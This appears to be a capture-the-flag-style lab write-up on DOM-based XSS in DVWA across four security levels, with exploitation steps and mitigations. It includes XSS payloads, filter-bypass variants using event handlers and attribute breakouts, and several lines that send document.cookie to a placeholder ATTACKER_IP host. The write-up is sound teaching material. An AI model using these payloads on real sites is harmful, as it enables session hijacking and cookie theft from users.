# 🗂️ Dom_XSS Vulnerability Writeup

📌 Description

DOM-Based Cross-Site Scripting (DOM XSS) occurs when client-side JavaScript processes user input in the Document Object Model (DOM) without proper sanitization, leading to the execution of arbitrary scripts. Unlike Reflected or Stored XSS, the malicious payload never reaches the server; it is executed entirely in the victim’s browser.

## ⚙️ Lab Setup
- **Platform**: DVWA (Damn Vulnerable Web Application)
- **Target Page**: `/vulnerabilities/xss_d/`
- **Tested With**: Firefox, Burp Suite, Kali Linux
- **Security Levels Tested**: Low, Medium, High, Impossible

## 🔓 Low Security Level

### 🛠️ Exploitation Steps

1 Navigate to http://127.0.0.1/DVWA/vulnerabilities/xss_d/
2 Test with simple payload http://127.0.0.1/DVWA/vulnerabilities/xss_d/#<script>alert(1)</script>
* If it works it popup 1 thus one(1) appears on the screen
3 You can use alternative payloads to filter bypass like Event Handlers
*#<img src=x onerror=alert('XSS')>, <svg onload=alert(document.domain)> etc
4 You can replace the alert(1) incase to you want to steal cookies through reverse
* #<img src=x onerror="fetch('http://ATTACKER_IP:9000/?c='+document.cookie)">
* #<script>window.location='http://ATTACKER_IP:1337/?c='+document.cookie
 When victims visit this crafted links, their cookies get exfiltrated to the attackers server since they listen through the respective ports.
------
NB: You can use burpsuite repeater to inject but Sometimes long scripts may not work in Burp Suite since it does not do auto-encoding but browser doe
-------

### ✅ Result

- Successful JavaScript execution in the victim’s browser.
- Payload requires only a crafted URL — no server-side filtering is involved.
- Confirmed ability to steal session tokens (document.cookie)

### 🔍 Weaknesses
- No Sanitization 
- Lack of Content Security Policy(CSP) 

🔐 Mitigations

- Sanitize inputs in client-side before inserting
- Implement Content Security Policy(CSP) to blocl inlinen scripts


## 🟡 Medium Security Level

### 🛠️ Exploitation Steps
1 Observe behavior of the vulnerable page when you visit http://127.0.0.1/DVWA/vulnerabilities/xss_d/ 
*check the dev Tools shows some charactwrs are encoded
2 Basic payload like this <script>alert(1)</script> will not work due to encode
3 Try injecting an HTML element with event handler like this http://127.0.0.1/DVWA/vulnerabilities/xss_d/#"><img src=x onerror=alert(1)>  this will break out of the attribute and execute the JavaScript.
4 Previlage escalation(Weaponization) to steal cookies with this payload
*#"><img src=x onerror="window.location='http://ATTACKER_IP:9000/?c='+document.cookie">
5 When victims click the crafted URL, their browsers send their session cookies to the attacker.

 ✅ Result
- Achieved DOM-based XSS using event handlers and context-breaking payloads.
- Confirmed the possibility of stealing cookies

🔎 Weaknesses
Filters only encode obvious tags like <script> but do not account for:
* Event handlers(onerror, onload etc)
* Breaking out of HTML attributes

### 🛡️ Mitigation Needed
- Apply strong client-side sanitization
- Enforce Content Security

---
NB:<img> tags are invalid in <options> tag so you need to break out of it first thus <select></select>


## 🔴 High Security Level
1 Analze page behavior 
2 Simple payload fails #<script>alert(1)</script> 
3 By bypass by injecting payload that does not rely on <script> but exploit attributes and event handlers like:
* #"><img src=x onerror=alert(1)> this payload closes the exiting attribute and uses image elements, and 'onerror' handler
4 Alternate payloads can be used
* #"><svg onload=alert(document.domain)>
5 Exfiltrate cookies to attacker controlled server with is payload whenever victim clik the link it redirect to the attacker
* #"><img src=x onerror="fetch('http://ATTACKER_IP:9000/?cookie='+document.cookie)">

✅ Result
- Demonstrated real-world impact: cookie theft and session hijacking.
- By breaking out of the attribute context and leveraging event handlers, arbitrary JavaScript execution is achieved.

🔎 Weaknesses
- No Content Security Policy (CSP) prevents inline JavaScript execution.
- It easy to use event handlers to bypass

🔐 Mitigations
- Implement strict input validation using allow-lists instead of blacklists
- Enforce a strong Content Security Policy (CSP) to block inline scripts and limit allowed sources.
- Sanitize inputs

NB: Event Handlers can be use to bypass inthe high level

-------

## 🔴 Impossible Level

1 These payloads may fail and not execute
* #<script>alert(1)</script>
* #"><img src=x onerror=alert(1)>
* #<svg onload=alert(1)>

2 HTML is sanitize before accepted



